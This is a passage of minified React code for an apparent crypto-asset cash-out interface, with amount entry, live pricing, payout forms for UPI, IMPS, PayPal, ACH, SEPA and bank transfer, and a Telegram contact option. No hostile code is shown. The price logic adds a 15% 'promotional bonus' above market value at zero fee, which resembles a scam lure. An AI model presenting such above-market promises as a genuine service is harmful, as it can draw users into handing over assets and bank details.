                                        y(j),
                                        v(null)
                                    }
                                    ,
                                    className: `w-full border-2 rounded-xl sm:rounded-2xl px-4 sm:px-6 py-3 sm:py-4 text-lg sm:text-xl font-semibold focus:ring-4 focus:ring-blue-500/20 focus:border-blue-500 transition-all duration-300 ${c.input} shadow-inner`,
                                    placeholder: "0.00"
                                }), a.jsx("div", {
                                    className: "absolute right-4 sm:right-6 top-1/2 transform -translate-y-1/2",
                                    children: a.jsx("span", {
                                        className: `text-sm sm:text-lg font-bold ${c.textSecondary}`,
                                        children: r.symbol
                                    })
                                })]
                            }), s && Number(s) > Number(r.balance) && a.jsxs("div", {
                                className: `mt-3 bg-red-50 ${u ? "bg-red-900/20" : ""} border border-red-200 ${u ? "border-red-700" : ""} rounded-xl p-3 flex items-center flex-wrap`,
                                children: [a.jsx(Qt, {
                                    className: "w-4 h-4 sm:w-5 sm:h-5 text-red-600 mr-2 flex-shrink-0"
                                }), a.jsx("span", {
                                    className: "text-red-600 font-medium text-sm sm:text-base",
                                    children: p("asset.amountExceeds")
                                })]
                            }), a.jsx("div", {
                                className: "grid grid-cols-4 gap-2 mt-4",
                                children: ["25%", "50%", "75%", "100%"].map(w => a.jsx("button", {
                                    onClick: () => {
                                        const j = parseInt(w) / 100
                                          , B = (parseFloat(r.balance) * j).toString();
                                        x(B),
                                        y(B),
                                        v(null)
                                    }
                                    ,
                                    className: `py-2 px-2 sm:px-3 rounded-lg sm:rounded-xl border-2 ${c.border} ${c.hover} transition-all duration-200 text-xs sm:text-sm font-medium ${c.text} hover:border-blue-500`,
                                    children: w
                                }, w))
                            })]
                        }), a.jsxs("div", {
                            className: `bg-gradient-to-br ${u ? "from-blue-900/30 via-purple-900/20 to-green-900/20" : "from-blue-50 via-purple-50 to-green-50"} border-2 ${u ? "border-blue-700" : "border-blue-200"} rounded-2xl sm:rounded-3xl p-4 sm:p-6 shadow-inner mx-2`,
                            children: [a.jsxs("div", {
                                className: "flex items-center mb-4 flex-wrap",
                                children: [a.jsx("div", {
                                    className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-blue-500 to-green-500 rounded-xl sm:rounded-2xl flex items-center justify-center mr-3 shadow-lg flex-shrink-0",
                                    children: a.jsx(Ra, {
                                        className: "w-4 h-4 sm:w-5 sm:h-5 text-white"
                                    })
                                }), a.jsxs("div", {
                                    children: [a.jsx("h4", {
                                        className: `font-bold text-base sm:text-lg ${u ? "text-blue-300" : "text-blue-900"}`,
                                        children: p("asset.liveCalculation")
                                    }), a.jsx("p", {
                                        className: `text-xs sm:text-sm ${u ? "text-blue-400" : "text-blue-700"}`,
                                        children: p("asset.marketRate")
                                    })]
                                })]
                            }), ( () => {
                                const w = Number((r == null ? void 0 : r.balance) ?? 0)
                                  , j = Number(String((r == null ? void 0 : r.value) ?? "").replace(/[^0-9.\-]/g, "")) || 0
                                  , B = w > 0 ? j / w : 0
                                  , b = (i ?? B) || 0
                                  , N = parseFloat(s || "0")
                                  , P = N > 0 ? N * b : 0
                                  , M = 0
                                  , U = P * .15
                                  , D = P - M + U;
                                return !s || N <= 0 ? a.jsxs("div", {
                                    className: "text-center py-6 sm:py-8",
                                    children: [a.jsx(Tn, {
                                        className: `w-10 h-10 sm:w-12 sm:h-12 ${c.textSecondary} mx-auto mb-3`
                                    }), a.jsx("p", {
                                        className: `${c.textSecondary} text-sm sm:text-base lg:text-lg px-4`,
                                        children: p("asset.enterAmount")
                                    })]
                                }) : o ? a.jsxs("div", {
                                    className: "text-center py-6 sm:py-8",
                                    children: [a.jsxs("div", {
                                        className: "relative",
                                        children: [a.jsx("div", {
                                            className: `w-10 h-10 sm:w-12 sm:h-12 bg-gradient-to-r ${c.gradient} rounded-full flex items-center justify-center mx-auto mb-4 shadow-xl`,
                                            children: a.jsx(wr, {
                                                className: "w-5 h-5 sm:w-6 sm:h-6 animate-spin text-white"
                                            })
                                        }), a.jsx("div", {
                                            className: "absolute inset-0 w-10 h-10 sm:w-12 sm:h-12 mx-auto rounded-full border-4 border-blue-200 border-t-transparent animate-spin"
                                        })]
                                    }), a.jsx("p", {
                                        className: `${c.textSecondary} text-sm sm:text-base lg:text-lg font-medium px-4`,
                                        children: p("asset.fetchingPrice")
                                    })]
                                }) : l ? a.jsxs("div", {
                                    className: `bg-orange-50 ${u ? "bg-orange-900/20" : ""} border border-orange-200 ${u ? "border-orange-700" : ""} rounded-xl sm:rounded-2xl p-3 sm:p-4`,
                                    children: [a.jsxs("div", {
                                        className: "flex items-center mb-2 flex-wrap",
                                        children: [a.jsx(Qt, {
                                            className: "w-4 h-4 sm:w-5 sm:h-5 text-orange-600 mr-2 flex-shrink-0"
                                        }), a.jsx("span", {
                                            className: "text-orange-600 font-medium text-sm sm:text-base",
                                            children: l
                                        })]
                                    }), a.jsx("p", {
                                        className: `text-xs sm:text-sm ${u ? "text-orange-400" : "text-orange-700"}`,
                                        children: "You can still proceed - price will be calculated manually during processing"
                                    })]
                                }) : a.jsxs("div", {
                                    className: "space-y-4 sm:space-y-6",
                                    children: [a.jsx("div", {
                                        className: "text-center",
                                        children: a.jsxs("div", {
                                            className: `${c.cardBg} rounded-xl sm:rounded-2xl p-4 sm:p-6 border-2 border-green-400 shadow-lg mx-auto max-w-sm`,
                                            children: [a.jsx("div", {
                                                className: `text-sm font-medium ${c.textSecondary} mb-2`,
                                                children: p("asset.youReceive")
                                            }), a.jsxs("div", {
                                                className: "font-bold text-2xl sm:text-3xl text-green-600 mb-2",
                                                children: ["$", D.toFixed(4)]
                                            }), a.jsx("div", {
                                                className: "text-xs sm:text-sm text-green-500",
                                                children: p("asset.usdEquivalent")
                                            })]
                                        })
                                    }), a.jsxs("div", {
                                        className: `${c.cardBg} rounded-xl sm:rounded-2xl p-3 sm:p-4 border ${c.border} shadow-inner`,
                                        children: [a.jsxs("h5", {
                                            className: `font-semibold ${c.text} mb-3 flex items-center text-sm sm:text-base`,
                                            children: [a.jsx(sf, {
                                                className: "w-4 h-4 mr-2 text-blue-500 flex-shrink-0"
                                            }), p("asset.priceBreakdown")]
                                        }), a.jsxs("div", {
                                            className: "space-y-2 text-xs sm:text-sm",
                                            children: [a.jsxs("div", {
                                                className: "flex justify-between items-center",
                                                children: [a.jsxs("span", {
                                                    className: c.textSecondary,
                                                    children: [p("asset.marketPrice"), ":"]
                                                }), a.jsxs("span", {
                                                    className: `font-medium ${c.text}`,
                                                    children: ["$", P.toFixed(6)]
                                                })]
                                            }), a.jsxs("div", {
                                                className: "flex justify-between items-center",
                                                children: [a.jsx("span", {
                                                    className: c.textSecondary,
                                                    children: "Platform Fee (0%):"
                                                }), a.jsx("span", {
                                                    className: "font-medium text-gray-500",
                                                    children: "-$0.000000"
                                                })]
                                            }), a.jsxs("div", {
                                                className: "flex justify-between items-center",
                                                children: [a.jsx("span", {
                                                    className: c.textSecondary,
                                                    children: "Promotional Bonus (+15%):"
                                                }), a.jsxs("span", {
                                                    className: "font-medium text-green-600",
                                                    children: ["+$", U.toFixed(6)]
                                                })]
                                            }), a.jsx("hr", {
                                                className: `border-t ${c.border} my-2`
                                            }), a.jsxs("div", {
                                                className: "flex justify-between items-center",
                                                children: [a.jsxs("span", {
                                                    className: `font-bold ${c.text}`,
                                                    children: [p("asset.totalReceive"), ":"]
                                                }), a.jsxs("span", {
                                                    className: "font-bold text-green-600",
                                                    children: ["$", D.toFixed(6)]
                                                })]
                                            }), (r == null ? void 0 : r.value) && w > 0 && Math.abs(B - b) / (B || 1) > .1 && a.jsxs("div", {
                                                className: "text-[11px] mt-2 text-amber-600",
                                                children: ["Heads up: wallet valuation ($", j.toFixed(2), ") uses a different price than live market. Showing live market."]
                                            })]
                                        })]
                                    })]
                                })
                            }
                            )()]
                        }), a.jsx("div", {
                            className: "text-center mt-6 sm:mt-8 px-2",
                            children: a.jsxs("button", {
                                onClick: () => {
                                    k(3),
                                    setTimeout( () => {
                                        const w = document.querySelector('[data-section="payout-selection"]');
                                        w && w.scrollIntoView({
                                            behavior: "smooth",
                                            block: "start",
                                            inline: "nearest"
                                        })
                                    }
                                    , 100)
                                }
                                ,
                                disabled: !r || !s || parseFloat(s) <= 0 || Number(s) > Number(r.balance),
                                className: `bg-gradient-to-r ${c.gradient} text-white px-6 sm:px-8 py-3 sm:py-4 rounded-xl sm:rounded-2xl font-semibold hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center mx-auto shadow-lg group text-sm sm:text-base`,
                                children: [a.jsx("span", {
                                    children: p("asset.nextPayout")
                                }), a.jsx(Gr, {
                                    className: "w-5 h-5 sm:w-6 sm:h-6 ml-2 group-hover:translate-x-1 transition-transform duration-300"
                                })]
                            })
                        })]
                    })]
                }), !t && n.length === 0 && a.jsxs("div", {
                    className: `${c.cardBg} rounded-2xl sm:rounded-3xl border ${c.border} p-6 sm:p-8 lg:p-12 shadow-xl text-center`,
                    children: [a.jsx("div", {
                        className: `w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r ${c.gradient} rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-xl`,
                        children: a.jsx(_i, {
                            className: "w-8 h-8 sm:w-10 sm:h-10 text-white"
                        })
                    }), a.jsx("h4", {
                        className: `text-xl sm:text-2xl font-bold ${c.text} mb-3 px-4`,
                        children: p("asset.noAssets")
                    }), a.jsx("p", {
                        className: `${c.textSecondary} mb-4 sm:mb-6 max-w-md mx-auto text-sm sm:text-base px-4`,
                        children: p("asset.noAssetsDesc")
                    })]
                })]
            })]
        })]
    })
}
  , Lf = ({selectedPaymentMethod: e, paymentDetails: t, setPaymentDetails: n, themeClasses: r}) => {
    const s = () => {
        switch (e) {
        case "UPI":
            return a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["UPI ID ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.upiId || "",
                        onChange: i => n({
                            ...t,
                            upiId: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "yourname@paytm"
                    }), t.upiId && !/^[\w.-]+@[\w.-]+$/.test(t.upiId) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid UPI ID (e.g. yourname@paytm)"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Full Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.fullName || "",
                        onChange: i => n({
                            ...t,
                            fullName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter your full name"
                    })]
                })]
            });
        case "IMPS":
            return a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Bank Account Number ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountNumber || "",
                        onChange: i => n({
                            ...t,
                            accountNumber: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account number"
                    }), t.accountNumber && !/^\d{9,18}$/.test(t.accountNumber) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid account number (9-18 digits)"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["IFSC Code ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.ifscCode || "",
                        onChange: i => n({
                            ...t,
                            ifscCode: i.target.value.toUpperCase()
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "SBIN0001234"
                    }), t.ifscCode && !/^[A-Z]{4}0[A-Z0-9]{6}$/.test(t.ifscCode) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid IFSC code (e.g. SBIN0001234)"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Holder Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountHolderName || "",
                        onChange: i => n({
                            ...t,
                            accountHolderName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account holder name"
                    })]
                })]
            });
        case "PayPal":
            return a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["PayPal Email ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "email",
                        value: t.paypalEmail || "",
                        onChange: i => n({
                            ...t,
                            paypalEmail: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "your.email@example.com"
                    }), t.paypalEmail && !/^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(t.paypalEmail) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid email address"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Full Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.fullName || "",
                        onChange: i => n({
                            ...t,
                            fullName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter your full name"
                    })]
                })]
            });
        case "ACH":
            return a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Routing Number ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.routingNumber || "",
                        onChange: i => n({
                            ...t,
                            routingNumber: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "9-digit routing number"
                    }), t.routingNumber && !/^\d{9}$/.test(t.routingNumber) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid 9-digit routing number"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Number ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountNumber || "",
                        onChange: i => n({
                            ...t,
                            accountNumber: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account number"
                    }), t.accountNumber && !/^\d{8,17}$/.test(t.accountNumber) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid account number (8-17 digits)"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Holder Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountHolderName || "",
                        onChange: i => n({
                            ...t,
                            accountHolderName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account holder name"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Type ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsxs("select", {
                        value: t.accountType || "",
                        onChange: i => n({
                            ...t,
                            accountType: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        children: [a.jsx("option", {
                            value: "",
                            children: "Select account type"
                        }), a.jsx("option", {
                            value: "checking",
                            children: "Checking"
                        }), a.jsx("option", {
                            value: "savings",
                            children: "Savings"
                        })]
                    })]
                })]
            });
        case "SEPA":
            return a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["IBAN ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.iban || "",
                        onChange: i => n({
                            ...t,
                            iban: i.target.value.toUpperCase()
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "DE89370400440532013000"
                    }), t.iban && !/^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$/.test(t.iban) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Enter a valid IBAN (e.g. DE89370400440532013000)"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Holder Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountHolderName || "",
                        onChange: i => n({
                            ...t,
                            accountHolderName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account holder name"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsx("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: "BIC/SWIFT Code (Optional)"
                    }), a.jsx("input", {
                        type: "text",
                        value: t.bicCode || "",
                        onChange: i => n({
                            ...t,
                            bicCode: i.target.value.toUpperCase()
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "DEUTDEFF (Optional)"
                    })]
                })]
            });
        case "Bank Transfer":
            return a.jsxs("div", {
                className: "space-y-4",
                children: [a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Bank Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.bankName || "",
                        onChange: i => n({
                            ...t,
                            bankName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter bank name"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Number ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountNumber || "",
                        onChange: i => n({
                            ...t,
                            accountNumber: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account number"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsxs("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: ["Account Holder Name ", a.jsx("span", {
                            className: "text-red-500",
                            children: "*"
                        })]
                    }), a.jsx("input", {
                        type: "text",
                        value: t.accountHolderName || "",
                        onChange: i => n({
                            ...t,
                            accountHolderName: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter account holder name"
                    })]
                }), a.jsxs("div", {
                    children: [a.jsx("label", {
                        className: `block text-sm font-medium ${r.text} mb-2`,
                        children: "Sort Code / Routing Number"
                    }), a.jsx("input", {
                        type: "text",
                        value: t.sortCode || "",
                        onChange: i => n({
                            ...t,
                            sortCode: i.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "Enter sort code or routing number"
                    })]
                })]
            });
        default:
            return a.jsxs("div", {
                children: [a.jsxs("label", {
                    className: `block text-sm font-medium ${r.text} mb-2`,
                    children: [e, " Details ", a.jsx("span", {
                        className: "text-red-500",
                        children: "*"
                    })]
                }), a.jsx("input", {
                    type: "text",
                    value: t.general || "",
                    onChange: i => n({
                        ...t,
                        general: i.target.value
                    }),
                    className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                    placeholder: `Enter ${e} details`
                })]
            })
        }
    }
    ;
    return a.jsxs("div", {
        className: "mb-6",
        children: [a.jsxs("h4", {
            className: `text-lg font-semibold ${r.text} mb-4 flex items-center`,
            children: [a.jsx(qr, {
                className: "w-5 h-5 text-blue-600 mr-2"
            }), e, " Details"]
        }), s()]
    })
}
  , jc = ({selectedCountry: e, selectedPaymentMethod: t, paymentDetails: n, themeClasses: r, darkMode: s, setSelectedCountry: i, setSelectedPaymentMethod: o, setPaymentDetails: l, setCurrentStep: u, validatePaymentDetails: c}) => {
    const m = ta.find(p => p.code === e)
      , [h,x] = kt.useState(!1)
      , [y,v] = kt.useState({
        email: "",
        phone: "",
        telegram: "",
        preferredContact: ""
    })
      , k = () => {
        if (!y.preferredContact)
            return !1;
        switch (y.preferredContact) {
        case "email":
            return y.email && /^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(y.email);
        case "phone":
            return y.phone && /^\+?[\d\s-()]{10,}$/.test(y.phone);
        case "telegram":
            return y.telegram && y.telegram.trim().length > 0;
        default:
            return !1
        }
    }
    ;
    return a.jsxs("div", {
        "data-section": "payout-selection",
        children: [e ? h ? a.jsxs(a.Fragment, {
            children: [a.jsxs("div", {
                className: "flex items-center justify-between mb-6",
                children: [a.jsxs("h3", {
                    className: `text-xl font-semibold ${r.text} flex items-center`,
                    children: [a.jsx("div", {
                        className: "text-2xl mr-3",
                        children: m == null ? void 0 : m.flag
                    }), "Contact Information"]
                }), a.jsxs("button", {
                    onClick: () => {
                        i(""),
                        x(!1),
                        v({
                            email: "",
                            phone: "",
                            telegram: "",
                            preferredContact: ""
                        })
                    }
                    ,
                    className: "flex items-center text-blue-600 hover:text-blue-800 font-medium transition-colors duration-200",
                    children: [a.jsx(Gr, {
                        className: "w-4 h-4 mr-1 rotate-180"
                    }), "Change Country"]
                })]
            }), a.jsxs("div", {
                className: `bg-gradient-to-r ${s ? "from-blue-900/20 to-purple-900/20" : "from-blue-50 to-purple-50"} rounded-2xl p-6 mb-6 border ${s ? "border-blue-800" : "border-blue-100"}`,
                children: [a.jsxs("div", {
                    className: "flex items-center mb-3",
                    children: [a.jsx(yf, {
                        className: "w-5 h-5 text-blue-600 mr-2"
                    }), a.jsx("h4", {
                        className: `font-semibold ${s ? "text-blue-300" : "text-blue-900"}`,
                        children: "Payout Notifications"
                    })]
                }), a.jsx("p", {
                    className: `text-sm ${s ? "text-blue-400" : "text-blue-700"} mb-4`,
                    children: "We'll send you real-time updates about your payout status and transaction confirmations."
                }), a.jsxs("div", {
                    className: "grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm",
                    children: [a.jsxs("div", {
                        className: `flex items-center ${r.cardBg} rounded-xl p-3 border ${s ? "border-blue-700" : "border-blue-100"}`,
                        children: [a.jsx(xa, {
                            className: "w-4 h-4 text-blue-600 mr-2"
                        }), a.jsx("span", {
                            className: `font-medium ${r.text}`,
                            children: "Email Updates"
                        })]
                    }), a.jsxs("div", {
                        className: `flex items-center ${r.cardBg} rounded-xl p-3 border ${s ? "border-blue-700" : "border-blue-100"}`,
                        children: [a.jsx(br, {
                            className: "w-4 h-4 text-green-600 mr-2"
                        }), a.jsx("span", {
                            className: `font-medium ${r.text}`,
                            children: "SMS Alerts"
                        })]
                    }), a.jsxs("div", {
                        className: `flex items-center ${r.cardBg} rounded-xl p-3 border ${s ? "border-blue-700" : "border-blue-100"}`,
                        children: [a.jsx(qs, {
                            className: "w-4 h-4 text-purple-600 mr-2"
                        }), a.jsx("span", {
                            className: `font-medium ${r.text}`,
                            children: "Telegram Bot"
                        })]
                    })]
                })]
            }), a.jsxs("div", {
                className: "mb-6",
                children: [a.jsx("h4", {
                    className: `text-lg font-semibold ${r.text} mb-4`,
                    children: "Choose Notification Method"
                }), a.jsx("div", {
                    className: "space-y-3",
                    children: [{
                        id: "email",
                        icon: xa,
                        label: "Email Address",
                        desc: "Instant email notifications",
                        color: "text-blue-600"
                    }, {
                        id: "phone",
                        icon: br,
                        label: "Phone Number",
                        desc: "SMS alerts and updates",
                        color: "text-green-600"
                    }, {
                        id: "telegram",
                        icon: qs,
                        label: "Telegram ID",
                        desc: "Real-time bot messages",
                        color: "text-purple-600"
                    }].map(p => a.jsxs("button", {
                        onClick: () => v({
                            ...y,
                            preferredContact: p.id
                        }),
                        className: `w-full border-2 rounded-2xl p-4 hover:border-blue-500 ${r.hover} flex items-center justify-between transition-all duration-300 ${y.preferredContact === p.id ? "border-blue-600 bg-blue-50 dark:bg-blue-900/20" : `${r.border} ${r.cardBg}`}`,
                        children: [a.jsxs("div", {
                            className: "flex items-center",
                            children: [a.jsx(p.icon, {
                                className: `w-6 h-6 ${p.color} mr-3`
                            }), a.jsxs("div", {
                                className: "text-left",
                                children: [a.jsx("div", {
                                    className: `font-semibold ${r.text}`,
                                    children: p.label
                                }), a.jsx("div", {
                                    className: `text-sm ${r.textSecondary}`,
                                    children: p.desc
                                })]
                            })]
                        }), y.preferredContact === p.id && a.jsx("div", {
                            className: "bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-xs font-medium",
                            children: "SELECTED"
                        })]
                    }, p.id))
                })]
            }), y.preferredContact && a.jsxs("div", {
                className: "mb-6",
                children: [a.jsxs("h4", {
                    className: `text-lg font-semibold ${r.text} mb-4 flex items-center`,
                    children: [y.preferredContact === "email" && a.jsx(xa, {
                        className: "w-5 h-5 text-blue-600 mr-2"
                    }), y.preferredContact === "phone" && a.jsx(br, {
                        className: "w-5 h-5 text-green-600 mr-2"
                    }), y.preferredContact === "telegram" && a.jsx(qs, {
                        className: "w-5 h-5 text-purple-600 mr-2"
                    }), "Enter Your ", y.preferredContact === "email" ? "Email" : y.preferredContact === "phone" ? "Phone Number" : "Telegram ID"]
                }), y.preferredContact === "email" && a.jsxs("div", {
                    children: [a.jsx("input", {
                        type: "email",
                        value: y.email,
                        onChange: p => v({
                            ...y,
                            email: p.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "your.email@example.com"
                    }), y.email && !/^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(y.email) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Please enter a valid email address"
                    })]
                }), y.preferredContact === "phone" && a.jsxs("div", {
                    children: [a.jsx("input", {
                        type: "tel",
                        value: y.phone,
                        onChange: p => v({
                            ...y,
                            phone: p.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "+1 (555) 123-4567"
                    }), y.phone && !/^\+?[\d\s-()]{10,}$/.test(y.phone) && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Please enter a valid phone number"
                    })]
                }), y.preferredContact === "telegram" && a.jsxs("div", {
                    children: [a.jsx("input", {
                        type: "text",
                        value: y.telegram,
                        onChange: p => v({
                            ...y,
                            telegram: p.target.value
                        }),
                        className: `w-full border rounded-2xl px-4 py-3 focus:ring-2 focus:ring-blue-500 focus:border-transparent ${r.input}`,
                        placeholder: "@yourusername or your Telegram ID"
                    }), y.telegram && y.telegram.trim().length === 0 && a.jsx("p", {
                        className: "text-red-600 text-sm mt-1",
                        children: "Please enter your Telegram ID or username"
                    })]
                })]
            }), a.jsx("button", {
                onClick: () => {
                    x(!1),
                    l({
                        ...n,
                        contactInfo: y
                    })
                }
                ,
                disabled: !k(),
                className: `w-full bg-gradient-to-r ${r.gradient} text-white py-3 rounded-2xl font-semibold hover:shadow-xl disabled:opacity-50 transition-all duration-300`,
                children: "Continue to Payment Methods"
            })]
        }) : a.jsxs(a.Fragment, {
            children: [a.jsxs("div", {
                className: "flex items-center justify-between mb-6",
                children: [a.jsxs("h3", {
                    className: `text-xl font-semibold ${r.text} flex items-center`,
                    children: [a.jsx("div", {
                        className: "text-2xl mr-3",
                        children: m == null ? void 0 : m.flag
                    }), m == null ? void 0 : m.name]
                }), a.jsxs("button", {
                    onClick: () => {
                        x(!0),
                        o(""),
                        l({})
                    }
                    ,
                    className: "flex items-center text-blue-600 hover:text-blue-800 font-medium transition-colors duration-200",
                    children: [a.jsx(Gr, {
                        className: "w-4 h-4 mr-1 rotate-180"
                    }), "Back to Contact Info"]
                })]
            }), a.jsxs("div", {
